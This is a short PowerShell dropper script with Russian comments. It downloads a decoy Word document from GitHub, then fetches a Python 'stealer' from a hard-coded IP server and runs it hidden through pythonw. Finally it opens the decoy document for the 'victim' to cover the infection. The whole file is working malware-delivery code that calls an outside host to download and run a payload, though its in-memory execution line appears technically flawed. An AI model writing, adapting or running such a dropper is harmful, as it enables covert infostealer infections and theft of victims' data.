# dropper.ps1
$gh = "https://raw.githubusercontent.com/DubrovinAlex2005/drop/main/lab5.docx"
$sv = "https://92.242.164.31:8443/api/staler.py"

# 1. Скачиваем decoy-документ в видимую папку TEMP
try { 
    Invoke-WebRequest -Uri $gh -OutFile "$env:TEMP\lab5.docx" -UseBasicParsing | Out-Null
} catch {}

# 2. Скачиваем стайлер с сервера и запускаем его в памяти (pythonw.exe)
try {
    $py = (Invoke-WebRequest -Uri $sv -UseBasicParsing).Content
    Start-Process pythonw.exe -ArgumentList "-c", "import sys; exec(sys.stdin.read())" `
        -WindowStyle Hidden -NoNewWindow -Wait -RedirectStandardInput ([System.IO.MemoryStream]::new([Text.Encoding]::UTF8.GetBytes($py))) | Out-Null
} catch {}

# 3. Ждём завершения процесса и открываем документ для жертвы
Start-Sleep -Seconds 1
try { 
    Start-Process "$env:TEMP\lab5.docx"
} catch {}
